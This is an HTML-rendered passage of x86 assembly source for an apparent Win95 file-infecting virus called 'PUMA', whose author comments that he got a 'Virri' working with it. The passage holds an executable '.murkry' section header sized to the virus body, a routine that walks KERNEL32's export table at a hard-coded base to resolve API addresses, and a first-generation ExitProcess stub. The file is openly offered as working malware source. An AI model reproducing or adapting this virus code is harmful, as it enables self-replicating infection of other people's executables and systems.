</span><span class="sc5">SEC_HEADER</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">".murkry"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">;                       0   0</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">VirSize</span><span class="sc0">         </span><span class="sc1">;                       8   8</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;Virtual size           c   12</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;Virtual Address        10  16</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;SizeRawData            14  20</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;PtrRawData             18  24</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;PtrRelocs              1c  28</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;PtrLineNos             20  32</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;NumRelocs              24  36</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;NumLineNos             28  40</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Code_Sec</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">Executable</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">Readable</span><span class="sc0"> </span><span class="sc1">;     2c  44</span><span class="sc0">

</span><span class="sc1">;-------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; While jhb wrote the code for below and more or less got is to work</span><span class="sc0">
</span><span class="sc1">; I played with it and with his help got a Virri working with it</span><span class="sc0">
</span><span class="sc1">; yea it has some hard code with it and will fail horrible with NT</span><span class="sc0">
</span><span class="sc1">;and I suspect any win95 version that moves the kernel form bff7000h</span><span class="sc0">
</span><span class="sc1">;but I somehow dount that</span><span class="sc0">
</span><span class="sc1">; well thats it for my commets</span><span class="sc0">
</span><span class="sc1">;Murk</span><span class="sc0">

 
</span><span class="sc1">;===========================================================================</span><span class="sc0">
</span><span class="sc5">Export_rva</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">kern1</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">Export_rva</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> 
</span><span class="sc5">baseF</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">kern1</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> 
</span><span class="sc5">AddFunc</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">baseF</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">AddName</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">AddFunc</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">Nindex</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">AddName</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> 
</span><span class="sc5">AddOrd</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">Nindex</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">limit</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">AddOrd</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">        
</span><span class="sc5">Where</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">limit</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">Looking</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">Where</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">worksp</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">Looking</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc1">;all above used by the GetProcAdd</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc5">GetProcAdd</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;esi = the list of address's   delimited by Zero end in 0Bh ;Looking</span><span class="sc0">
</span><span class="sc1">;edi = the space we will put it on the stack </span><span class="sc0">
</span><span class="sc1">;edx = offset of program</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">  
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc5">worksp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
         

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc5">Where</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">              </span><span class="sc1">;save where will store them </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Looking</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">;save which ones looking fo</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kern</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PUMA</span><span class="sc0"> </span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'ZM'</span><span class="sc0">                </span><span class="sc1">;we assume Bff70000h for location</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Not95</span><span class="sc0">                  </span><span class="sc1">;of the Kernel</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">3Ah</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kern</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PUMA</span><span class="sc0"> </span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;if this is not true get out</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'EP'</span><span class="sc0">                </span><span class="sc1">;same thing if this is not true</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Not95</span><span class="sc0">                  </span><span class="sc1">;something is wrong</span><span class="sc0">

</span><span class="sc1">;found the PE header</span><span class="sc0">
</span><span class="sc1">;        sub     esi,4           ;back up si to the PE header</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kern1</span><span class="sc4">],</span><span class="sc8">eSI</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">74h</span><span class="sc0">         </span><span class="sc1">;should be 78h but the last lodsw</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">                   </span><span class="sc1">;should be rva to the .edata</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kern</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PUMA</span><span class="sc0"> </span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">;should be the .edata area</span><span class="sc0">
                                        </span><span class="sc1">;offset to the to name of dll</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;get us to the base</span><span class="sc0">
                                        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">baseF</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;this is the starting ordinal that</span><span class="sc0">
                                        </span><span class="sc1">;that all must be added to</span><span class="sc0">
                                        </span><span class="sc1">;usualy 1 for kernel32</span><span class="sc0">

        </span><span class="sc6">lodsd</span><span class="sc0">                           </span><span class="sc1">;total number of exported functions</span><span class="sc0">
                                        </span><span class="sc1">;by name and ordinal</span><span class="sc0">

        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">limit</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;how many functions are exported</span><span class="sc0">
                                        </span><span class="sc1">;by name this is the limit of how many</span><span class="sc0">
                                        </span><span class="sc1">;we will search for        </span><span class="sc0">

</span><span class="sc1">;the next three are all RVA's to the</span><span class="sc0">
</span><span class="sc1">;fields so we need to add the offset</span><span class="sc0">
</span><span class="sc1">;them</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">                           </span><span class="sc1">;this is the address to</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kern</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PUMA</span><span class="sc0"> </span><span class="sc4">]</span><span class="sc0">    
                                    </span><span class="sc1">;an array of pointers to the</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AddFunc</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;entry point rva's of each </span><span class="sc0">

        </span><span class="sc6">lodsd</span><span class="sc0">                           </span><span class="sc1">;this is the RVA to ascii names</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kern</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PUMA</span><span class="sc0"> </span><span class="sc4">]</span><span class="sc0">    
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AddName</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;of each named exported function</span><span class="sc0">

        </span><span class="sc6">lodsd</span><span class="sc0">                           </span><span class="sc1">; rva points to  array of words </span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kern</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PUMA</span><span class="sc0"> </span><span class="sc4">]</span><span class="sc0">    
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AddOrd</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; which are the export ordinals- the base</span><span class="sc0">

</span><span class="sc1">;ok we have everthing we need to go ahead and locate the address's of the</span><span class="sc0">
</span><span class="sc1">;KERNEL32.dll functions</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Looking</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;get address of the first name</span><span class="sc0">


</span><span class="sc5">LookLoop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AddName</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;get the first rva pointer to a name</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Nindex</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;now make it a true pointer to the</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kern</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PUMA</span><span class="sc0"> </span><span class="sc4">]</span><span class="sc0"> 
                                    </span><span class="sc1">;name by adding the offset</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">;sets the counter to 0</span><span class="sc0">
 

</span><span class="sc5">TryAgain</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">;what function we are looking for</span><span class="sc0">
                                        </span><span class="sc1">;now simple cmp strs</span><span class="sc0">
</span><span class="sc5">MatchByte</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmpsb</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">      </span><span class="sc5">NextOne</span><span class="sc0">                </span><span class="sc1">;not it try next nameof fucntion</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;if equal to 0 we found a match</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">GotIt</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">MatchByte</span><span class="sc0">               </span><span class="sc1">;nope try next byte</span><span class="sc0">

</span><span class="sc5">NextOne</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">limit</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">jge</span><span class="sc0">      </span><span class="sc5">not_found</span><span class="sc0">

       </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Nindex</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">      </span><span class="sc1">;get the next pointer rva</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Nindex</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;and try again</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kern</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PUMA</span><span class="sc0"> </span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">       </span><span class="sc5">TryAgain</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">GotIt</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;note if not a match is found the all other from then on in are blank</span><span class="sc0">
</span><span class="sc1">;in other words dont mispell ,or ask for for a function that is not in</span><span class="sc0">
</span><span class="sc1">; KERNEL32</span><span class="sc0">
</span><span class="sc1">;esi = the 0 at the end of the name of the strings given to us to look for</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;cx = the index into the AddOrd</span><span class="sc0">
</span><span class="sc1">;take Nindex * 4 + [AddOrd] = Ordinal</span><span class="sc0">
</span><span class="sc1">;Ordinal * 4 + [AddFunc] should be the rva to the fuction</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;get set for next search routine</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">;*2 looking into a word array</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">Esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AddOrd</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">Esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;here ax equals the ordinal - the base</span><span class="sc0">
</span><span class="sc1">;if ordinal is passed to hear then we should be able to skip</span><span class="sc0">
</span><span class="sc1">;searching for a name and hit here</span><span class="sc0">
</span><span class="sc1">;not sure of course but it tested on a few that I tried</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                </span><span class="sc1">;*4 looking into a dword array</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AddFunc</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">Esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">Edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">Edi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kern</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PUMA</span><span class="sc0"> </span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Where</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Where</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc2">0bh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">LookLoop</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">over_error</span><span class="sc0">
        
</span><span class="sc5">Not95</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">;if the header of the kernel</span><span class="sc0">
                                        </span><span class="sc1">;is not there forget it, its not</span><span class="sc0">
                                        </span><span class="sc1">; the Win95 we know and love ;)        </span><span class="sc0">

</span><span class="sc5">not_found</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">; String pass to us is not a </span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">; valid fucntion name</span><span class="sc0">

</span><span class="sc5">over_error</span><span class="sc4">:</span><span class="sc0">
                
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">ESP</span><span class="sc4">,</span><span class="sc5">worksp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;YEA HARD CODED &lt;SIGH&gt;</span><span class="sc0">

</span><span class="sc5">kern</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0BFF70000h</span><span class="sc0">      </span><span class="sc1">;must add to all rva's</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">VirSize</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">PUMA</span><span class="sc0">


</span><span class="sc5">fini</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc1">;left over from a Teacher who use to teach me C++</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc1">;call    dword ptr edi          ;when I used the routine to locate</span><span class="sc0">
                                        </span><span class="sc1">;the ExitProcess address</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">             </span><span class="sc1">;this simply terminates the program</span><span class="sc0">

         </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">PUMA</span><span class="sc0">


</span></div></body>
</html>
